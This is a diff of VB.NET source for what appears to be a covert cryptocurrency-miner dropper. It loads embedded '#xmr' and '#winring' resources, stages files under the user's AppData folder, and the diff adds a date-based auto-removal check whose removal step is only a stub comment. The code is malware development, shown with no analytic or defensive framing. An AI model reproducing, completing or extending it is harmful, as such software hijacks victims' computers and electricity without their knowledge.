@@ -45,6 +45,8 @@ Public Class Program
         Initialize()
     End Sub
 
+
+
 #If INS Then
     Public Shared Sub Install()
         Thread.Sleep(2 * 1000)
@@ -115,10 +117,20 @@ Public Class Program
             Dim x As Byte() = GetTheResource("#xmr")
             Dim xm As Byte() = New Byte() {}
             Dim wr As Byte() = GetTheResource("#winring")
+            Dim lb As String = GetString("#LIBSPATH")
+            Dim EnableRemovalDate = GetString("#EnableAutoRemoval")
+            Dim todaysdate As DateTime = DateTime.Now
             Dim RemovalDate As String = GetString("#RemovalDate")
-            Dim todaysdate As String = String.Format("{0:dd/MM/yyyy}", DateTime.Now)
-            Debug.WriteLine("Removal Date: " + RemovalDate + "Todays Date: " + todaysdate)
-            Dim AutoRemovalDate As String = GetString("#LIBSPATH")
+            If (RemovalDate IsNot "None") Then
+                Dim RemovalDateAsTime As DateTime = Convert.ToDateTime(RemovalDate)
+                If (EnableRemovalDate = "True") Then
+                    If (todaysdate > RemovalDateAsTime) Then
+                        'Start the removal'
+                    End If
+                End If
+
+            End If
+
             Dim bD As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\" & lb
             Dim rS As String = ""
 
